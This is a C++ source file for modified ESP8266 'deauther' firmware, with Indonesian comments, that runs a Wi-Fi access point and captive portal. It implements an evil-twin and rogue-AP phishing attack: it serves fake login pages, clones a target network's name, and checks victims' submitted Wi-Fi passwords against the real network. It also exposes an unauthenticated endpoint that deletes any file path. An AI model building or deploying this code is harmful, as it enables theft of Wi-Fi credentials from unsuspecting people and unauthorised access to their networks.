/* This software is licensed under the MIT License: https://github.com/spacehuhntech/esp8266_deauther */

#include "wifi.h"

extern "C" {
    #include "user_interface.h"
}

#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <LittleFS.h>
#include <EEPROM.h>
#include "Accesspoints.h"
#include "language.h"
#include "debug.h"
#include "settings.h"
#include "repeater.h"
#include "CLI.h"
#include "Attack.h"
#include "Scan.h"
#include "DisplayUI.h"

// --- 1. DEFINISI TYPE (Wajib paling atas agar tidak error 'does not name a type') ---
typedef enum wifi_mode_t {
    off = 0,
    ap  = 1,
    st  = 2
} wifi_mode_t;

typedef struct ap_settings_t {
    char    path[33];
    char    ssid[33];
    char    password[65];
    uint8_t channel;
    bool    hidden;
    bool    captive_portal;
} ap_settings_t;

// --- 2. VARIABEL GLOBAL ---
String MAC_;
String nama;
char eviltwinpath[32];
char pishingpath[32];
File webportal;
String tes_password;
String data_pishing;
String LOG;
String json_data;
String fileList = ""; 
bool hidden_target = false;
bool rogueap_continues = false;

extern bool progmemToSpiffs(const char* adr, int len, String path);
#include "webfiles.h"

extern Scan   scan;
extern CLI    cli;
extern Attack attack;

namespace wifi {
    // --- 3. VARIABEL DALAM NAMESPACE ---
    wifi_mode_t   mode;
    ap_settings_t ap_settings;
    ESP8266WebServer server(80);
    DNSServer dns;
    IPAddress ip WEB_IP_ADDR;
    IPAddress netmask(255, 255, 255, 0);

    // --- 4. FUNGSI HANDLER (Ditaruh sebelum dipanggil di startAP) ---
    void handleFileListJS(){
        server.send(200, "text/plain", fileList);
    }

    void send_eviltwin() {
        File f = LittleFS.open("/eviltwin.html", "r");
        if(f) {
            server.streamFile(f, "text/html");
            f.close();
        } else {
            server.send(404, "text/plain", "File Eviltwin Hilang");
        }
    }

    void send_rogueap() {
        File f = LittleFS.open("/rogue.html", "r");
        if(f) {
            server.streamFile(f, "text/html");
            f.close();
        } else {
            server.send(404, "text/plain", "File Rogue Hilang");
        }
    }

    void handleDelete() {
        String path = server.arg("path");
        if(LittleFS.remove(path)) server.send(200, "text/plain", "Berhasil Dihapus");
        else server.send(500, "text/plain", "Gagal Hapus");
    }

    void sendFSjson() {
        server.send(200, "application/json", json_data);
    }

    void pathsave() {
        server.send(200, "text/plain", "Path Tersimpan");
    }

    // --- 5. FUNGSI LOGIKA UTAMA ---
    void begin() {
        mode = wifi_mode_t::off;
        WiFi.mode(WIFI_OFF);
        wifi_set_opmode(STATION_MODE);
    }

    void startAP() {
        WiFi.softAPConfig(ip, ip, netmask);
        WiFi.softAP(ap_settings.ssid, ap_settings.password, ap_settings.channel, ap_settings.hidden);
        dns.start(53, "*", ip);
        
        server.on("/filelist", handleFileListJS);
        server.on("/delete", handleDelete);
        server.on("/filemanager.json", sendFSjson);
        server.on("/websetting", HTTP_POST, pathsave);

        server.on("/", HTTP_GET, []() {
            if(!attack.eviltwin && !attack.pishing){
                File f = LittleFS.open("/index.html", "r");
                if(f) {
                    server.streamFile(f, "text/html");
                    f.close();
                } else {
                    server.send(200, "text/html", "<b>Web Interface Belum Diupload ke LittleFS</b>");
                }
            } else {
                if(attack.eviltwin) send_eviltwin();
                if(attack.pishing) send_rogueap();
            }
        });

        server.begin();
        mode = wifi_mode_t::ap;
    }

    void ethiddenAP() {
        WiFi.mode(WIFI_AP_STA);
        hidden_target = true;
        WiFi.softAPConfig(IPAddress(172, 217, 28, 254), IPAddress(172, 217, 28, 254), IPAddress(255, 255, 255, 0));
        WiFi.softAP(ssids.rogue_wifi.c_str());
        dns.start(53, "*", IPAddress(172, 217, 28, 254));

        server.on("/result", [](){
            if (WiFi.status() != WL_CONNECTED) {
                // Teks Bahasa Indonesia
                server.send(200, "text/html", "<script>alert('Gagal! Cek Password lagi');history.back();</script>");
                tes_password = "";
            } else {
                server.send(200, "text/html", "<h2>Sukses! Target Terhubung.</h2>");
                ESP.restart();
            }
        });
        server.begin();
    }

    void update() {
        if (mode != wifi_mode_t::off) {
            server.handleClient();
            dns.processNextRequest();
        }
    }
}
